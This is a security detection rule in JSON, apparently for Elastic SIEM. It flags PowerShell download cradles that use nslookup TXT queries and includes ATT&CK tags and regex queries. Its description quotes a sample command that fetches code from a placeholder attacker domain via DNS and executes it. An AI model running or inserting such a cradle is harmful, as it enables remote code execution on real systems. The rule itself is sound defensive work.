{"id":"72671447-4352-4413-bb91-b85569687135","created_by":"Zach Mathis (@yamatosecurity)","name":"Nslookup PwSh Download Cradle","tags":["attack.command_and_control","attack.t1105","attack.t1071.004"],"interval":"5m","description":"This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]","risk_score":47,"enabled":true,"severity":"medium","false_positives":null,"from":"now-720s","type":"query","language":"lucene","index":["winlogbeat-*","logs-*"],"query":"(process.parent.executable:/.*\\\\[Pp][Oo][Ww][Ee][Rr][Ss][Hh][Ee][Ll][Ll]\\.[Ee][Xx][Ee]/ AND process.executable:/.*[Nn][Ss][Ll][Oo][Oo][Kk][Uu][Pp].*/ AND process.command_line:/.*\\=[Tt][Xx][Tt]\\ .*/)","rule_id":"72671447-4352-4413-bb91-b85569687135","timestamp_override":"event.ingested","references":["https://twitter.com/alh4zr3d/status/1566489367232651264"],"note":"**Detection Rule without Regex for better understanding. Be careful, this way is case sensitive:**`(process.parent.executable:*\\\\powershell.exe AND process.executable:*nslookup* AND process.command_line:*\\=txt\\ *)`"}
